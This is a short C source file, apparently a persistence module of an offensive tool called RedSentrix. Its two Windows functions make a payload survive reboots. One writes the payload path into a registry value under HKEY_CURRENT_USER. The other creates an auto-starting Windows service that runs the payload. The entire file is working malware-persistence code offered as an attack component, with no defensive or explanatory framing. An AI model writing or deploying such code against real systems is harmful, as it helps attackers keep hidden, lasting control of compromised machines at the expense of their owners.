/*
 * RedSentrix - Persistence Module (C)
 * Establishes persistence mechanisms
 */

#ifdef _WIN32
#include <windows.h>
#include <stdio.h>

/*
 * Windows Registry Persistence
 */
int persist_registry(const char *key_path, const char *value_name, const char *payload_path) {
    HKEY hKey;
    LONG result;
    
    result = RegOpenKeyExA(HKEY_CURRENT_USER, key_path, 0, KEY_WRITE, &hKey);
    if (result != ERROR_SUCCESS) {
        return -1;
    }
    
    result = RegSetValueExA(hKey, value_name, 0, REG_SZ, 
                           (const BYTE*)payload_path, strlen(payload_path) + 1);
    RegCloseKey(hKey);
    
    return (result == ERROR_SUCCESS) ? 0 : -1;
}

/*
 * Windows Service Persistence
 */
int persist_service(const char *service_name, const char *display_name, const char *payload_path) {
    SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCManager) {
        return -1;
    }
    
    SC_HANDLE hService = CreateServiceA(
        hSCManager,
        service_name,
        display_name,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        payload_path,
        NULL, NULL, NULL, NULL, NULL
    );
    
    if (!hService) {
        CloseServiceHandle(hSCManager);
        return -1;
    }
    
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return 0;
}
#endif

